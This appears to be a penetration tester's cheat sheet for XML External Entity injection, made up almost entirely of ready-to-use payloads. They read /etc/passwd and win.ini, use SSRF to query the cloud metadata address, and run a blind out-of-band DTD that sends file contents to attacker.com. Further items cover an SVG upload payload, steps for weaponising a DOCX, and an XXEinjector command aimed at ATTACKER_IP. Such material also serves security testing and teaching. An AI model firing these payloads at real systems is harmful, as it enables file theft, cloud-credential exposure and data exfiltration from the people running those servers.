# XXE — XML External Entity Injection

**CWE:** CWE-611 | **OWASP:** A05:2021

---

## Finding XXE

```bash
# Look for XML in requests:
# - Content-Type: application/xml
# - Content-Type: text/xml
# - SOAP endpoints
# - File uploads (docx, xlsx, svg, plist)
# - JSON endpoints that also accept XML (change Content-Type)
# - /api, /webservices, /soap

# Convert JSON to XML test
Content-Type: application/xml
<?xml version="1.0"?>
<root><user>admin</user></root>
```

---

## Payloads

```xml
<!-- Basic LFI via XXE -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Windows -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Blind XXE via OOB (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % xxe SYSTEM "http://your.interactsh.url/malicious.dtd">
  %xxe;
]>

<!-- malicious.dtd hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

<!-- PHP wrapper XXE (base64 encode file contents) -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

---

## SVG XXE (File Upload Vector)

```xml
<!-- Upload as .svg file -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## DOCX/XLSX XXE

```bash
# Office files are ZIP archives containing XML
mkdir xxe_docx
cd xxe_docx
cp benign.docx test.docx
unzip test.docx -d extracted/

# Edit extracted/word/document.xml or extracted/xl/workbook.xml
# Add XXE entity at the top of the XML declaration

# Repack
cd extracted/
zip -r ../evil.docx .
```

---

## Automated Testing

```bash
# XXEinjector
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=80 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=http

# Burp Suite — Active Scan targets XML params
# Also: Collaborator Everywhere extension for blind XXE detection
```
